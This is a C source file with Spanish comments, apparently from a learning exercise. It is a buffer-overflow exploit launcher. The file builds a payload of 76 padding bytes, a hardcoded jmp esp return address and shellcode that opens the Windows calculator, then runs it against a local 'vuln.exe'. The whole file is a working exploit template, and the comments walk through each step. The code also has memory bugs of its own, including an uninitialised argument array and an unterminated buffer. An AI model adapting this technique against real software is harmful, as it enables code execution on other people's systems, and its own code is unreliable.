#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>


int main (int argc,char **argv)
{
	if(argc != 2)
	{
	    printf("tsunami needs 1 argument.");
        return (0);	
	}
    //char buffer[1024]="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS";
    //Para sobrescribir la zona de memoria que queremos, primero tenemos que llenar un buffer con 76 bytes de basura.
    char buffer[1024];
    memcpy(buffer,argv[1],strlen(argv[1]));
    if(strlen(argv[1]) != 76)
    {
        printf("The argument must contain 76 characters.");
        return (0);
    }
									
	LoadLibrary("msvcrt.dll");
    //El offset mediante el cual ejecutaremos el shellcode de la calculadora. Este puede ser extraido
    //de librerias de windows que siemprese ejecutan, como la kernel32.dll ó ntdll.dll, mediante el
    //uso de herramientas externas.
    char jmp_esp[]="\x7B\x46\x86\x7C";

    //Este shellcode ejecuta la calculadora. En este caso se ha obtenido mediante la ejecucion de un
    //programa en c que ejecuta la calculadora y posteriormente pasandolo por un debugger para optener los opcodes
    char calc_code[]="\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x08\xC6\x45\xF7\x63"
	"\xC6\x45\xF8\x61\xC6\x45\xF9\x6C\xC6\x45\xFA\x63\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD"
    "\x78\xC6\x45\xFE\x65\x8D\x45\xF7\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";   

    char **vuln_arg;
      
    //Concatenamos el buffer para que cuando se produzca el overflow, el return de la vulnerabilidad
    //se sobrescriba con el offsett de la instruccion jmp_esp contenida en la libreria kernel32.dll
    //que siempre se ejecuta
    strcat(buffer,jmp_esp);
    //Concatenamos lo anterior con el shellcode que ejecuta la calculadora para que cuando el
    //jmp_esp sobrescriba el return, este la ejecute. Con esto nuestro payload está listo para hacer "maldades"
    strcat(buffer,calc_code);

    //Guardamos en una variable los argumentos que vamos a mandar a la vulnerabilidad
    vuln_arg[0] = "vuln";
    vuln_arg[1] = buffer;
    vuln_arg[2] = NULL;
   
    execv ("vuln.exe",vuln_arg);
}
